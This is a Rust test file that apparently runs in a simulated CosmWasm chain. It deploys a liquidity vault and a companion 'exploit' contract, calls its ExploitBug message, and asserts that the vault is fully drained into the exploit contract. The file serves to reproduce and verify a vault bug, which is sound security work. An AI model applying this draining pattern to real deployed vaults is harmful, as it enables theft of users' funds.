use cosmwasm_std::{Addr, Coin};
use cw_multi_test::Executor;
use vault_network::exploit::{ExecuteMsg, InstantiateMsg};

use super::{
    get_fees,
    mock_app::mock_app_with_balance,
    store_code::{store_cw20_token_code, store_exploit_code, store_vault_code},
};
pub const OWNER: &str = "creator";

#[test]
fn proper_initialization() {
    let sender = Addr::unchecked(OWNER);
    let mut app = mock_app_with_balance(vec![(
        sender.clone(),
        vec![Coin {
            amount: 1_000_000_000_000u128.into(),
            denom: "uluna".to_string(),
        }],
    )]);
    let vault = store_vault_code(&mut app);
    let exploit = store_exploit_code(&mut app);
    let token_id = store_cw20_token_code(&mut app);

    let vault_addr = app
        .instantiate_contract(
            vault,
            sender.clone(),
            &vault_network::vault::InstantiateMsg {
                owner: sender.to_string(),
                token_id,
                asset_info: terraswap::asset::AssetInfo::NativeToken {
                    denom: "uluna".into(),
                },
                fee_collector_addr: "collector".to_string(),
                vault_fees: get_fees(),
            },
            &[],
            "vault",
            None,
        )
        .unwrap();

    let exploit = app
        .instantiate_contract(
            exploit,
            sender.clone(),
            &InstantiateMsg {
                vault_addr: vault_addr.to_string(),
            },
            &[],
            "r",
            None,
        )
        .unwrap();

    println!(
        "vault: {}, exploit: {}",
        vault_addr.clone(),
        exploit.clone()
    );
    app.send_tokens(
        sender.clone(),
        vault_addr.clone(),
        &[Coin {
            amount: 1_000_000_000u128.into(),
            denom: "uluna".to_string(),
        }],
    )
    .unwrap();

    app.send_tokens(
        sender.clone(),
        exploit.clone(),
        &[Coin {
            amount: 10u128.into(),
            denom: "uluna".to_string(),
        }],
    )
    .unwrap();

    app.execute_contract(
        sender.clone(),
        exploit.clone(),
        &ExecuteMsg::ExploitBug { loops: 3 },
        &[],
    )
    .unwrap();

    let vault_balance = app.wrap().query_balance(vault_addr, "uluna").unwrap();
    let exploit_balance = app.wrap().query_balance(exploit, "uluna").unwrap();

    assert_eq!(vault_balance, Coin::new(0, "uluna"));
    assert_eq!(exploit_balance, Coin::new(1000000010, "uluna"));
}
